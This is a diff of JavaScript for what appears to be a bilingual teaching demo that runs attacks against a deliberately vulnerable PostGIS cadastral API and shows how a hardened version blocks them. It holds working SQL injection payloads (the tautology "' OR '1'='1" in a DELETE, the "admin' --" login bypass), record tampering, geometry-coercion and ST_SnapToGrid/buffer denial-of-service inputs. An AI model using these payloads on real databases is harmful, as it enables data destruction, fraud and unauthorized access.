+            isSpanish ? 'Barrera 1 & 2 (SCIG): Cota quad_segs ≤ 16 y Costo C_geom ≤ 5000' : 'Barrier 1 & 2 (SCIG): Bound quad_segs ≤ 16 & Cost C_geom ≤ 5000'
           );
           setInspectorData(
-            'Radio Acotado a Rango Seguro',
-            `SELECT ... ST_Buffer(geom, :buffer_metros) WHERE cod_sector = :sector LIMIT 50\n[Validación Pydantic: buffer_metros float acotado a gt=0, le=100.0]`,
+            isSpanish ? 'Vector 4 Bloqueado: Cota Estática de Costo Geométrico' : 'Vector 4 Blocked: Geometric Static Cost Bound',
+            `[SCIG Ecuación 1: C_geom(g, r, q) = N_cand * V(g) * (1 + 4q) * (1 + Area(MBR)/A_sector) <= 5000]\n[Parámetros acotados: buffer_metros <= 100.0, quad_segs <= 16]`,
             duration,
             res.status,
-            '🛡️ CPU PROTEGIDA',
-            `Pydantic validó que el radio sea numérico y menor a 100 metros, descartando subconsultas y buffers desmedidos.`
+            isSpanish ? '🛡️ CPU PROTEGIDA (SCIG)' : '🛡️ CPU PROTECTED (SCIG)',
+            isSpanish
+              ? `La Guardia SCIG rechazó quad_segs=192 y buffer_metros=2500 en ${duration} ms antes de invocar a PostGIS, manteniendo la CPU estable.`
+              : `SCIG Guard rejected quad_segs=192 and buffer_metros=2500 in ${duration} ms before invoking PostGIS, keeping CPU stable.`
           );
         }
       } catch (e) {
@@ -1703,14 +2389,16 @@
       }
     }
 
-    // V4
-    async function runAttack4_Tampering() {
-      highlightActiveAttackBtn('btnAtk4');
-      setLoadingState("Ejecutando Amenaza 4: Fraude en Ficha Catastral...");
+    // V5: Coerción GEOMETRYCOLLECTION (DE-9IM)
+    async function runAttack5_TypeCoercion() {
+      highlightActiveAttackBtn('btnAtk5');
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Vector 5: Coerción GEOMETRYCOLLECTION (Evasión DE-9IM)..." : "Executing Vector 5: GEOMETRYCOLLECTION Type Coercion (DE-9IM Bypass)...");
       const start = performance.now();
-      
-      const url = `${API_BASE}/${activeMode}/ficha/modificar?id_lote=21010101000000&nuevo_autovaluo=0&nuevo_titular=${encodeURIComponent('HACKER_TERRENOS_ILEGAL')}`;
-      
+
+      const payloadWkt = "GEOMETRYCOLLECTION(POINT(278957 8667542), LINESTRING(278957 8667542, 279007 8667592))";
+      const url = `${API_BASE}/${activeMode}/ficha/geometria?id_lote=15010100000001&wkt_geom=${encodeURIComponent(payloadWkt)}`;
+
       try {
         const res = await fetch(url, { method: 'POST' });
         const duration = (performance.now() - start).toFixed(2);
@@ -1718,34 +2406,42 @@
 
         if (activeMode === 'vulnerable') {
           updatePipelineDisplay(
-            { state: 'bypassed', label: 'BYPASS' },
-            { state: 'bypassed', label: 'N/A' },
-            { state: 'bypassed', label: 'UPDATE EJECUTADO' },
-            'Ninguna (Corrupción Fiscal)'
+            { state: 'bypassed', label: 'ST_IsValid() = TRUE' },
+            { state: 'bypassed', label: isSpanish ? 'SIN FILTRO DE-9IM' : 'NO DE-9IM FILTER' },
+            { state: 'bypassed', label: isSpanish ? 'ÁREA = 0.0 m²' : 'AREA = 0.0 m²' },
+            isSpanish ? 'Ninguna (Corrupción Dimensional DE-9IM)' : 'None (DE-9IM Dimensional Corruption)'
           );
           setInspectorData(
-            'Modificación no Autorizada',
-            json.query_debug || "UPDATE catastro_titulares SET autovaluo_soles = 0, nombre_completo = 'HACKER_TERRENOS_ILEGAL' WHERE id_lote = '21010101000000';",
+            isSpanish ? 'Vector 5: Coerción de Tipo GEOMETRYCOLLECTION' : 'Vector 5: GEOMETRYCOLLECTION Type Coercion',
+            json.query_debug || `UPDATE tg_lote SET area_grafica = 0.0 WHERE id_lote = '15010100000001'`,
             duration,
             res.status,
-            '⚠️ DATOS ADULTERADOS',
-            `La orden UPDATE se ejecutó directamente: se suplantó al titular predial y el autovalúo quedó reducido a S/ 0.00.`
+            isSpanish ? '⚠️ ÁREA PREDIO = 0.0 m²' : '⚠️ PARCEL AREA = 0.0 m²',
+            isSpanish
+              ? `ST_IsValid() evaluó la colección como TRUE, pero al carecer de dimensión areal 2D, el predio 15010100000001 quedó con tipo ${json.nuevo_tipo} y ST_Area = ${json.nueva_area_m2} m². Se resalta en la tabla y en el mapa.`
+              : `ST_IsValid() evaluated collection as TRUE, but lacking 2D areal dimension, parcel 15010100000001 acquired type ${json.nuevo_tipo} and ST_Area = ${json.nueva_area_m2} m². Highlighted in table and map.`
           );
+          if (json.predios && json.predios.length > 0) {
+            displayParcelsInTableAndMap(json.predios, '#dc2626', isSpanish ? 'Vector 5: Coerción GEOMETRYCOLLECTION' : 'Vector 5: GEOMETRYCOLLECTION Coercion', true);
+            drawVector5Graphics();
+          }
           await loadStats();
         } else {
           updatePipelineDisplay(
-            { state: 'blocked', label: 'REGEX / GT=0 (422)' },
-            { state: 'standby', label: 'STANDBY' },
-            { state: 'standby', label: 'ORM PREVENTIVO' },
-            'Barrera 1: Pydantic Regex & Range'
+            { state: 'passed', label: isSpanish ? 'WKT PARSEADO' : 'WKT PARSED' },
+            { state: 'blocked', label: isSpanish ? 'NO ES POLYGON 2D (422)' : 'NOT 2D POLYGON (422)' },
+            { state: 'standby', label: isSpanish ? 'LOTE INTACTO' : 'INTACT PARCEL' },
+            isSpanish ? 'Barrera 2 (SCIG): Invariante Dimensional DE-9IM (Solo POLYGON)' : 'Barrier 2 (SCIG): DE-9IM Dimensional Invariant (POLYGON Only)'
           );
           setInspectorData(
-            'Reglas de Negocio Preservadas',
-            `UPDATE catastro_titulares SET autovaluo_soles = :autovaluo, nombre_completo = :titular WHERE id_lote = :id_lote\n[Validación: autovaluo gt=0, titular regex alfabético]`,
+            isSpanish ? 'Vector 5 Bloqueado: Invariante Topológico DE-9IM' : 'Vector 5 Blocked: DE-9IM Topological Invariant',
+            `[SCIG Etapa 2: geom.geom_type == 'Polygon' and geom.is_valid and geom.is_simple and geom.area >= 1.0]\nDetalle: ${JSON.stringify(json.detail || json)}`,
             duration,
             res.status,
-            '🛡️ DATOS PROTEGIDOS',
-            `Pydantic no permitió autovalúos en 0 ni caracteres extraños en el titular, y el ORM aisló los valores como parámetros seguros.`
+            isSpanish ? '🛡️ BLOQUEO DE-9IM (SCIG)' : '🛡️ DE-9IM BLOCK (SCIG)',
+            isSpanish
+              ? `SCIG exige estrictamente una superficie 2D simple (Polygon) con área mínima ≥ 1.0 m², rechazando colecciones heterogéneas aunque pasen ST_IsValid.`
+              : `SCIG strictly enforces a simple 2D surface (Polygon) with minimal area ≥ 1.0 m², rejecting heterogeneous collections even if ST_IsValid passes.`
           );
         }
       } catch (e) {
@@ -1753,133 +2449,237 @@
       }
     }
 
-    // V5
-    async function runAttack5_DataDestruction() {
-      highlightActiveAttackBtn('btnAtk5');
-      setLoadingState("Ejecutando Amenaza 5: Borrado Destructivo de Lotes...");
+    // V6: Colapso Topológico ST_SnapToGrid
+    async function runAttack6_GridSnapCollapse() {
+      highlightActiveAttackBtn('btnAtk6');
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Vector 6: Colapso Topológico ST_SnapToGrid (tolerancia=5000.0)..." : "Executing Vector 6: ST_SnapToGrid Topological Collapse (tolerance=5000.0)...");
       const start = performance.now();
-      
-      const payloadSector = "0101' OR '1'='1";
-      const url = `${API_BASE}/${activeMode}/predios/borrar?filtro_sector=${encodeURIComponent(payloadSector)}`;
-      
+
+      const url = `${API_BASE}/${activeMode}/predios/depurar-topologia?cod_sector=0101&tolerancia=5000.0&area_minima=1.0`;
+
+      try {
+        const res = await fetch(url, { method: 'POST' });
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+
+        if (activeMode === 'vulnerable') {
+          updatePipelineDisplay(
+            { state: 'bypassed', label: 'TOLERANCIA = 5000m' },
+            { state: 'bypassed', label: isSpanish ? 'SIN INVARIANTE ÁREA' : 'NO AREA INVARIANT' },
+            { state: 'bypassed', label: isSpanish ? 'COLAPSO A PUNTO 0 m²' : 'COLLAPSE TO POINT 0 m²' },
+            isSpanish ? 'Ninguna (Colapso Topológico Masivo)' : 'None (Massive Topological Collapse)'
+          );
+          setInspectorData(
+            isSpanish ? 'Vector 6: Colapso Topológico por ST_SnapToGrid' : 'Vector 6: ST_SnapToGrid Topological Collapse',
+            json.query_debug || "UPDATE tg_lote SET objcad_lote_gemo = ST_SnapToGrid(objcad_lote_gemo, 5000.0) WHERE cod_sector = '0101'",
+            duration,
+            res.status,
+            isSpanish ? '⚠️ COLAPSO TOPOLÓGICO' : '⚠️ TOPOLOGICAL COLLAPSE',
+            isSpanish
+              ? `La grilla de 5000.0 m colapsó todos los vértices de los predios del sector 0101 a un único nodo común (${json.predios_colapsados_area_cero} predios quedaron con ST_Area = 0.0 m²). Los lotes afectados se listan en la tabla.`
+              : `The 5000.0 m grid collapsed all vertices of parcels in sector 0101 into a single common node (${json.predios_colapsados_area_cero} parcels ended with ST_Area = 0.0 m²). Affected parcels are listed in the table.`
+          );
+          if (json.predios && json.predios.length > 0) {
+            displayParcelsInTableAndMap(json.predios, '#dc2626', isSpanish ? 'Vector 6: Lotes Colapsados ST_SnapToGrid' : 'Vector 6: ST_SnapToGrid Collapsed Parcels', true);
+            drawVector6Graphics();
+          }
+          await loadStats();
+        } else {
+          updatePipelineDisplay(
+            { state: 'blocked', label: isSpanish ? 'TOLERANCIA > 0.5m (422)' : 'TOLERANCE > 0.5m (422)' },
+            { state: 'standby', label: isSpanish ? 'INVARIANTE ÁREA' : 'AREA INVARIANT' },
+            { state: 'standby', label: isSpanish ? 'TOPOLOGÍA SEGURA' : 'SECURE TOPOLOGY' },
+            isSpanish ? 'Barrera 1 & 2 (SCIG): Tolerancia ST_SnapToGrid ≤ 0.5m' : 'Barrier 1 & 2 (SCIG): ST_SnapToGrid Tolerance ≤ 0.5m'
+          );
+          setInspectorData(
+            isSpanish ? 'Vector 6 Bloqueado: Cota de Tolerancia de Grilla' : 'Vector 6 Blocked: Grid Tolerance Bound',
+            `[SCIG Etapa 1 y 2: tolerancia <= 0.5 m y preservación de área ST_Area(geom) > 0]\nDetalle: ${JSON.stringify(json.detail || json)}`,
+            duration,
+            res.status,
+            isSpanish ? '🛡️ TOPOLOGÍA PROTEGIDA' : '🛡️ PROTECTED TOPOLOGY',
+            isSpanish
+              ? `SCIG restringe la tolerancia de ST_SnapToGrid a un máximo de 0.5 metros, impidiendo la degeneración de polígonos a puntos de área cero.`
+              : `SCIG restricts ST_SnapToGrid tolerance to a maximum of 0.5 meters, preventing polygon degeneration to zero-area points.`
+          );
+        }
+      } catch (e) {
+        showError(e);
+      }
+    }
+
+    // Ataques Relacionales Clásicos (Botones rápidos DML / Auth)
+    async function runAttack_Tampering() {
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Fraude Catastral (UPDATE Tampering)..." : "Executing Cadastral Tampering (UPDATE Tampering)...");
+      const start = performance.now();
+      const url = `${API_BASE}/${activeMode}/ficha/modificar?id_lote=15010100000000&nuevo_autovaluo=0&nuevo_titular=${encodeURIComponent('HACKER_TERRENOS_ILEGAL')}`;
+      try {
+        const res = await fetch(url, { method: 'POST' });
+        const duration = (performance.now() - start).toFixed(2);
+        const json = await res.json();
+        if (activeMode === 'vulnerable') {
+          setInspectorData(
+            isSpanish ? 'Fraude en Ficha Catastral' : 'Cadastral Record Tampering',
+            json.query_debug || "UPDATE catastro_titulares...",
+            duration,
+            res.status,
+            isSpanish ? '⚠️ DATOS ADULTERADOS' : '⚠️ DATA TAMPERED',
+            isSpanish ? 'Se suplantó al titular predial por "HACKER_TERRENOS_ILEGAL" y el autovalúo quedó reducido a S/ 0.00. Observa el primer registro de la tabla inferior.' : 'Owner was spoofed with "HACKER_TERRENOS_ILEGAL" and valuation was slashed to S/ 0.00. Check the first record in bottom table.'
+          );
+          if (json.predios && json.predios.length > 0) {
+            displayParcelsInTableAndMap(json.predios, '#dc2626', isSpanish ? 'Fraude UPDATE: Titular Suplantado' : 'UPDATE Tampering: Owner Spoofed', true);
+          }
+          await loadStats();
+        } else {
+          setInspectorData(
+            isSpanish ? 'Fraude Bloqueado' : 'Tampering Blocked',
+            'Validación Pydantic (autovaluo gt=0, regex titular) + Bind ORM',
+            duration,
+            res.status,
+            isSpanish ? '🛡️ DATOS PROTEGIDOS' : '🛡️ DATA PROTECTED',
+            isSpanish ? 'Pydantic rechazó el autovalúo 0 y caracteres inválidos.' : 'Pydantic rejected valuation 0 and invalid characters.'
+          );
+        }
+      } catch (e) { showError(e); }
+    }
+
+    async function runAttack_DataDestruction() {
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Purga Destructiva (DELETE Tautology)..." : "Executing Destructive Purge (DELETE Tautology)...");
+      const start = performance.now();
+      const url = `${API_BASE}/${activeMode}/predios/borrar?filtro_sector=${encodeURIComponent("0101' OR '1'='1")}`;
       try {
         const res = await fetch(url, { method: 'DELETE' });
         const duration = (performance.now() - start).toFixed(2);
         const json = await res.json();
-
         if (activeMode === 'vulnerable') {
-          // Limpiar inmediatamente los polígonos del mapa para reflejar el apagón cartográfico
-          if (geojsonLayer) {
-            map.removeLayer(geojsonLayer);
-            geojsonLayer = null;
+          if (geojsonLayer) { map.removeLayer(geojsonLayer); geojsonLayer = null; }
+          clearAttackOverlay();
+          const divResultados = document.getElementById('divResultadosBusqueda');
+          const tbody = document.getElementById('tblResultadosBusqueda');
+          if (divResultados && tbody) {
+            divResultados.className = 'd-block mt-2 pt-2 border-top';
+            tbody.innerHTML = `<tr><td colspan="5" class="text-center text-danger fw-bold py-3">${isSpanish ? '⚠️ TODOS LOS PREDIOS FUERON ELIMINADOS DE LA BASE DE DATOS (0 REGISTROS RESTANTES)' : '⚠️ ALL PARCELS WERE DELETED FROM DATABASE (0 RECORDS REMAINING)'}</td></tr>`;
           }
-          baseGeojsonData = null;
-
-          updatePipelineDisplay(
-            { state: 'bypassed', label: 'BYPASS' },
-            { state: 'bypassed', label: 'N/A' },
-            { state: 'bypassed', label: 'DELETE TOTAL' },
-            'Ninguna (Destrucción Total)'
-          );
           setInspectorData(
-            'Eliminación de la Cartografía',
-            json.query_debug || "DELETE FROM tg_lote WHERE cod_sector = '0101' OR '1'='1';",
+            isSpanish ? 'Purga Total del Catastro' : 'Full Cadastre Purge',
+            json.query_debug || "DELETE FROM tg_lote...",
             duration,
             res.status,
-            '⚠️ BORRADO TOTAL',
-            `La condición "OR '1'='1" eliminó todos los lotes del catastro (quedan ${json.lotes_restantes}). El mapa se actualizó vacío en tiempo real.`
+            isSpanish ? '⚠️ BORRADO TOTAL' : '⚠️ TOTAL DELETION',
+            isSpanish ? `La tautología eliminó todos los lotes (quedan ${json.lotes_restantes}). Usa "Restaurar BD" arriba para repoblar.` : `Tautology wiped all parcels (${json.lotes_restantes} left). Use "Restore DB" above to re-seed.`
           );
           await loadStats();
         } else {
-          updatePipelineDisplay(
-            { state: 'blocked', label: 'REGEX ^\\d{4}$ (422)' },
-            { state: 'standby', label: 'STANDBY' },
-            { state: 'standby', label: 'DELETE CONTROLADO' },
-            'Barrera 1: Pydantic Regex Validation'
-          );
           setInspectorData(
-            'Formato de Sector Validado',
-            `DELETE FROM tg_lote WHERE tg_lote.cod_sector = :filtro_sector\n[Validación Pydantic: regex=r"^\\d{4}$"]`,
+            isSpanish ? 'Borrado Bloqueado' : 'Deletion Blocked',
+            'Validación Pydantic regex=r"^\\d{4}$" + Bind ORM',
             duration,
             res.status,
-            '🛡️ BORRADO CONTROLADO',
-            `Pydantic exigió que el sector tenga exactamente 4 dígitos numéricos (^\\d{4}$), bloqueando cualquier intento de inyección.`
+            isSpanish ? '🛡️ BORRADO CONTROLADO' : '🛡️ DELETION CONTROLLED',
+            isSpanish ? 'El filtro de sector rechazó la tautología.' : 'Sector filter rejected the tautology.'
           );
         }
-      } catch (e) {
-        showError(e);
-      }
+      } catch (e) { showError(e); }
     }
 
-    // V6
-    async function runAttack6_AuthBypass() {
-      highlightActiveAttackBtn('btnAtk6');
-      setLoadingState("Ejecutando Amenaza 6: Evasión de Autenticación...");
+    async function runAttack_AuthBypass() {
+      const isSpanish = currentLang === 'es';
+      setLoadingState(isSpanish ? "Ejecutando Bypass de Autenticación (admin' --)..." : "Executing Authentication Bypass (admin' --)...");
       const start = performance.now();
-      
       const url = `${API_BASE}/${activeMode}/auth/login?username=${encodeURIComponent("admin' --")}&password=arbitraria`;
-      
       try {
         const res = await fetch(url, { method: 'POST' });
         const duration = (performance.now() - start).toFixed(2);
         const json = await res.json();
-
         if (res.status === 200 && activeMode === 'vulnerable') {
-          updatePipelineDisplay(
-            { state: 'bypassed', label: 'BYPASS' },
-            { state: 'bypassed', label: 'N/A' },
-            { state: 'bypassed', label: 'PASSWORD COMENTADA' },
-            'Ninguna (Acceso Ilegítimo)'
-          );
           setInspectorData(
-            'Evasión de Contraseña',
-            json.query_debug || "SELECT ... WHERE username = 'admin' --' AND password_hash = 'arbitraria';",
+            isSpanish ? 'Bypass de Autenticación' : 'Authentication Bypass',
+            json.query_debug || "SELECT ... WHERE username = 'admin' --'",
             duration,
             res.status,
-            '⚠️ ACCESO INDEBIDO',
-            `El comentario SQL "--" anuló el chequeo de la clave. El sistema inició sesión con rol '${json.usuario.role}' sin verificar la contraseña.`
+            isSpanish ? '⚠️ ACCESO INDEBIDO' : '⚠️ UNAUTHORIZED ACCESS',
+            isSpanish ? `El comentario "--" anuló la verificación de contraseña otorgando rol '${json.usuario.role}'.` : `Comment "--" neutralized password verification granting role '${json.usuario.role}'.`
           );
+          displayParcelsInTableAndMap([
+            {
+              id_lote: 'AUTH_SESSION_ROOT',
+              cod_sector: 'SEC_AUTH',
+              tipo_suelo: 'LOGIN_BYPASS',
+              titular: `${isSpanish ? 'SESIÓN ADMIN' : 'ADMIN SESSION'}: ${json.usuario ? json.usuario.username : 'admin'} (${isSpanish ? 'Rol' : 'Role'}: ${json.usuario ? json.usuario.role : 'SUPERADMIN'})`,
+              autovaluo: 0,
+              geojson: null
+            }
+          ], '#dc2626', isSpanish ? 'Bypass de Autenticación' : 'Auth Bypass', true);
         } else {
-          updatePipelineDisplay(
-            { state: 'blocked', label: 'REGEX / PARAM (401/422)' },
-            { state: 'standby', label: 'STANDBY' },
-            { state: 'passed', label: 'SHA-256 SEGURO' },
-            'Barrera 1 & 3: Prepared Statement + Hashing'
-          );
           setInspectorData(
-            'Autenticación Segura',
-            `SELECT ... WHERE username = :username AND password_hash = :hash\n[Validación: regex alfanumérico + hash SHA-256 compilado]`,
+            isSpanish ? 'Autenticación Segura' : 'Secure Authentication',
+            'Bind parameter :username + SHA-256',
             duration,
             res.status,
-            '🛡️ ACCESO SEGURO',
-            `El nombre de usuario se procesó como texto literal y la contraseña se validó mediante su hash criptográfico SHA-256.`
+            isSpanish ? '🛡️ ACCESO SEGURO' : '🛡️ SECURE ACCESS',
+            isSpanish ? 'El comentario SQL fue rechazado o tratado como literal.' : 'SQL comment was rejected or treated as literal.'
           );
         }
-      } catch (e) {
-        showError(e);
-      }
+      } catch (e) { showError(e); }
     }
 
     // ==========================================
-    // RESTAURACIÓN DEL CATASTRO
+    // RESTAURACIÓN Y ESCALA DEL CATASTRO
     // ==========================================
     async function resetDatabase() {
-      setLoadingState("Restaurando muestra original de 487 lotes...");
+      const sel = document.getElementById('selDatasetScale');
+      const btn = document.getElementById('btnResetDb');
+      const scale = sel ? parseInt(sel.value, 10) : 487;
+      const isSpanish = currentLang === 'es';
+
+      if (btn) btn.disabled = true;
+      if (sel) {
+        sel.value = String(scale);
+        sel.disabled = true;
+      }
+
+      const loadMsg = isSpanish
+        ? `Sembrando ${scale.toLocaleString()} predios reales OSM (Lima Metropolitana, EPSG:32718)...`
+        : `Seeding ${scale.toLocaleString()} real OSM parcels (Lima Metropolitan, EPSG:32718)...`;
+
+      setLoadingState(loadMsg);
+      document.getElementById('lblMapStatus').textContent = isSpanish ? 'Sembrando...' : 'Seeding...';
+
       try {
-        const res = await fetch(`${API_BASE}/admin/reset-catastro`, { method: 'POST' });
+        const res = await fetch(`${API_BASE}/admin/reset-catastro?scale=${scale}`, { method: 'POST' });
         const json = await res.json();
+        
         await loadStats();
         resetPipelineUI();
+
+        const titleMsg = isSpanish
+          ? `Catastro Reinicializado (N = ${scale.toLocaleString()} predios reales OSM)`
+          : `Cadastre Reset (N = ${scale.toLocaleString()} real OSM parcels)`;
+
+        const descMsg = isSpanish
+          ? `Se poblaron ${scale.toLocaleString()} lotes reales de OpenStreetMap (Lima Metropolitana, EPSG:32718) con topología íntegra e índice espacial GiST indexado.`
+          : `Populated ${scale.toLocaleString()} real OpenStreetMap parcels (Lima Metropolitan, EPSG:32718) with intact topology and GiST spatial index.`;
+
         setInspectorData(
-          "Catastro Reinicializado",
-          "-- TRUNCATE TABLE tg_lote, catastro_titulares; INSERT ... (487 parcelas LADM repobladas) --",
+          titleMsg,
+          `-- seed_data.py --scale ${scale} (Fuente: lima_osm_real.json, EPSG:32718, GiST index + ANALYZE) --`,
           "N/A",
           200,
-          "✅ RESTAURADO",
-          "Se repoblaron los 487 lotes originales y sus fichas prediales en la base de datos."
+          isSpanish ? "✅ RESTAURADO" : "✅ RESTORED",
+          descMsg
         );
+
+        fitCatastroBounds();
       } catch (e) {
         showError(e);
+      } finally {
+        if (sel) {
+          sel.disabled = false;
+          sel.value = String(scale);
+        }
+        if (btn) btn.disabled = false;
       }
     }
 
@@ -1912,7 +2712,7 @@
       let sql = '';
       switch (tipo) {
         case 'bypass':
-          sql = `SELECT id_lote, cod_sector, area_grafica, tipo_suelo, \n       ST_AsGeoJSON(ST_Transform(objcad_lote_gemo, 4326)) as geojson\nFROM tg_lote\nWHERE cod_sector = '0101' OR ST_DWithin(objcad_lote_gemo, ST_SetSRID(ST_MakePoint(389840.8, 8248727.8), 32719), 5000)\nLIMIT 50;`;
+          sql = `SELECT id_lote, cod_sector, area_grafica, tipo_suelo, \n       ST_AsGeoJSON(ST_Transform(objcad_lote_gemo, 4326)) as geojson\nFROM tg_lote\nWHERE cod_sector = '0101' OR ST_DWithin(objcad_lote_gemo, ST_SetSRID(ST_MakePoint(278957, 8667542), 32718), 5000)\nLIMIT 50;`;
           break;
         case 'dos':
           sql = `SELECT id_lote, ST_Area(ST_Buffer(objcad_lote_gemo, 100, 'quad_segs=40')) as area_buffer\nFROM tg_lote\nWHERE cod_sector = '0101'\nLIMIT 20;`;
@@ -1991,14 +2791,13 @@
             let detailsMsg = '';
             if (json.tipo_operacion === 'SELECT') {
               detailsMsg = currentLang === 'es'
-                ? `Consulta ejecutada en crudo. Retornó ${json.total_registros} registros.`
-                : `Raw query executed. Returned ${json.total_registros} records.`;
+                ? `Consulta ejecutada en crudo. Retornó ${json.total_registros} registros listados en la tabla.`
+                : `Raw query executed. Returned ${json.total_registros} records listed in the table.`;
 
-              if (json.geojson && json.geojson.features && json.geojson.features.length > 0) {
+              if (json.predios && json.predios.length > 0) {
+                displayParcelsInTableAndMap(json.predios, '#dc2626', 'Ataque Custom', true);
+              } else if (json.geojson && json.geojson.features && json.geojson.features.length > 0) {
                 renderGeojsonOnMap(json.geojson, '#dc2626', true);
-                detailsMsg += currentLang === 'es'
-                  ? ` Se proyectaron ${json.geojson.features.length} geometrías en rojo en el mapa.`
-                  : ` Rendered ${json.geojson.features.length} geometries in red on the map.`;
               }
             } else {
               detailsMsg = currentLang === 'es'
@@ -2075,7 +2874,7 @@
 
     function setLoadingState(msg) {
       document.getElementById('badgeVerdict').className = 'badge bg-warning text-dark font-mono';
-      document.getElementById('badgeVerdict').textContent = 'PROCESANDO...';
+      document.getElementById('badgeVerdict').textContent = currentLang === 'es' ? 'PROCESANDO...' : 'PROCESSING...';
       setBoxQueryValue(`-- ${msg} --`);
     }
 
@@ -2093,7 +2892,7 @@
       originalQueryTemplate = queryText;
       setBoxQueryValue(queryText);
       document.getElementById('lblLatency').textContent = `${latency} ms`;
-      document.getElementById('pipelineLatency').textContent = `Latencia: ${latency} ms`;
+      document.getElementById('pipelineLatency').textContent = `${currentLang === 'es' ? 'Latencia' : 'Latency'}: ${latency} ms`;
       document.getElementById('lblHttpCode').textContent = `HTTP ${httpCode}`;
       
       document.getElementById('boxExplanation').innerHTML = `
